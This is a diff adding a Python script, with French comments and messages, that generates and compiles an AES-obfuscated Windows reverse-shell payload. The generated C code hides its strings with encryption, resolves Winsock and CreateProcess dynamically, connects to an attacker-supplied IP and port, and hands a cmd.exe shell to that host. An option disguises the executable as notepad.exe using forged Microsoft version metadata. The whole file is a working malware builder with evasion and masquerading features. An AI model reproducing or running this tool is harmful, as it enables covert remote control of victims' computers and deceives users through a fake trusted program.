@@ -1,0 +1,172 @@
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad
+import argparse
+import subprocess
+import os
+
+key = b'1GJ7d9gY57Fdjo43'
+aes = AES.new(key, AES.MODE_ECB)
+
+def encrypt_bytes(text):
+    padded = pad(text.encode(), 16)
+    encrypted = aes.encrypt(padded)
+    return ', '.join(f'0x{b:02X}' for b in encrypted)
+
+def generate_payload_c(ip, cmd, port, notepad=False):
+    ip_enc = encrypt_bytes(ip)
+    cmd_enc = encrypt_bytes(cmd)
+
+    with open("payload.c", "w") as f:
+        f.write(f'''#include <winsock2.h>
+#include <ws2tcpip.h>
+#include <windows.h>
+#include <stdio.h>
+#include "aes.h"
+
+#pragma comment(lib, "ws2_32")
+
+const uint8_t key[16] = "1GJ7d9gY57Fdjo43";
+
+uint8_t enc_ip[]  = {{ {ip_enc} }};
+uint8_t enc_cmd[] = {{ {cmd_enc} }};
+
+void aes_decrypt_string(uint8_t* encrypted, char* output) {{
+    struct AES_ctx ctx;
+    AES_init_ctx(&ctx, key);
+    uint8_t tmp[16];
+    memcpy(tmp, encrypted, 16);
+    AES_ECB_decrypt(&ctx, tmp);
+    memcpy(output, tmp, 16);
+    output[15] = '\\0';
+}}
+
+FARPROC ResolveFunc(const char* dllName, const char* funcName) {{
+    HMODULE hMod = LoadLibraryA(dllName);
+    if (!hMod) return NULL;
+    return GetProcAddress(hMod, funcName);
+}}
+
+int main() {{
+    Sleep(5000);
+    char ip[16], cmd[16];
+    aes_decrypt_string(enc_ip, ip);
+    aes_decrypt_string(enc_cmd, cmd);
+
+    typedef int (WINAPI *WSAStartupFunc)(WORD, LPWSADATA);
+    typedef SOCKET (WINAPI *WSASocketAFunc)(int, int, int, LPWSAPROTOCOL_INFOA, GROUP, DWORD);
+    typedef int (WINAPI *ConnectFunc)(SOCKET, const struct sockaddr*, int);
+    typedef BOOL (WINAPI *CreateProcessAFunc)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES,
+                                               BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
+
+    WSAStartupFunc       _WSAStartup     = (WSAStartupFunc)ResolveFunc("ws2_32.dll", "WSAStartup");
+    WSASocketAFunc       _WSASocketA     = (WSASocketAFunc)ResolveFunc("ws2_32.dll", "WSASocketA");
+    ConnectFunc          _connect        = (ConnectFunc)ResolveFunc("ws2_32.dll", "connect");
+    CreateProcessAFunc   _CreateProcessA = (CreateProcessAFunc)ResolveFunc("kernel32.dll", "CreateProcessA");
+
+    if (!_WSAStartup || !_WSASocketA || !_connect || !_CreateProcessA)
+        return 1;
+
+    WSADATA wsaData;
+    _WSAStartup(MAKEWORD(2, 2), &wsaData);
+
+    SOCKET sock = _WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
+    if (sock == INVALID_SOCKET) return 1;
+
+    struct sockaddr_in server;
+    server.sin_family = AF_INET;
+    server.sin_port = htons({port});
+    inet_pton(AF_INET, ip, &server.sin_addr);
+
+    if (_connect(sock, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR)
+        return 1;
+
+    STARTUPINFOA si;
+    PROCESS_INFORMATION pi;
+    ZeroMemory(&si, sizeof(si));
+    si.cb = sizeof(si);
+    si.dwFlags = STARTF_USESTDHANDLES;
+    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;
+
+    if (!_CreateProcessA(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi))
+        return 1;
+
+    return 0;
+}}''')
+    print("[+] payload.c généré.")
+
+    if notepad:
+        with open("notepad.rc", "w") as rc:
+            rc.write(f'''
+id ICON "notepad.ico"
+
+1 VERSIONINFO
+FILEVERSION 10,0,19041,1
+PRODUCTVERSION 10,0,19041,1
+FILEOS 0x4
+FILETYPE 0x1
+BEGIN
+  BLOCK "StringFileInfo"
+  BEGIN
+    BLOCK "040904b0"
+    BEGIN
+      VALUE "CompanyName", "Microsoft Corporation"
+      VALUE "FileDescription", "Notepad"
+      VALUE "FileVersion", "10.0.19041.1"
+      VALUE "InternalName", "notepad.exe"
+      VALUE "OriginalFilename", "notepad.exe"
+      VALUE "ProductName", "Microsoft® Windows® Operating System"
+      VALUE "ProductVersion", "10.0.19041.1"
+    END
+  END
+  BLOCK "VarFileInfo"
+  BEGIN
+    VALUE "Translation", 0x0409, 1200
+  END
+END
+''')
+        print("[+] notepad.rc généré.")
+
+def compile_payload(notepad=False, keep=False):
+    exe_name = "notepad.exe" if notepad else "payload.exe"
+
+    try:
+        if notepad:
+            print("[*] Compilation avec icône et métadonnées...")
+            subprocess.run(["x86_64-w64-mingw32-windres", "notepad.rc", "-O", "coff", "-o", "notepad.res"], check=True)
+            subprocess.run([
+                "x86_64-w64-mingw32-gcc",
+                "payload.c", "aes.c", "notepad.res",
+                "-o", exe_name,
+                "-lws2_32"
+            ], check=True)
+        else:
+            print("[*] Compilation simple...")
+            subprocess.run([
+                "x86_64-w64-mingw32-gcc",
+                "payload.c", "aes.c",
+                "-o", exe_name,
+                "-lws2_32"
+            ], check=True)
+
+        print(f"[+] Compilation réussie : {exe_name}")
+    finally:
+        if not keep:
+            for file in ["payload.c", "notepad.rc", "notepad.res"]:
+                if os.path.exists(file):
+                    os.remove(file)
+                    print(f"[-] Fichier temporaire supprimé : {file}")
+        else:
+            print("[*] Option --keep activée : fichiers temporaires conservés.")
+
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser(description="Générateur de payload chiffré AES + compilation automatique")
+    parser.add_argument("--ip", required=True, help="Adresse IP à chiffrer")
+    parser.add_argument("--port", type=int, default=49557, help="Port TCP (par défaut : 49557)")
+    parser.add_argument("--cmd", default="cmd.exe", help="Commande à exécuter (par défaut : cmd.exe)")
+    parser.add_argument("--notepad", action="store_true", help="Faux notepad avec icône et métadonnées")
+    parser.add_argument("--keep", action="store_true", help="Conserver les fichiers temporaires")
+
+    args = parser.parse_args()
+
+    generate_payload_c(args.ip, args.cmd, args.port, args.notepad)
+    compile_payload(args.notepad, args.keep)
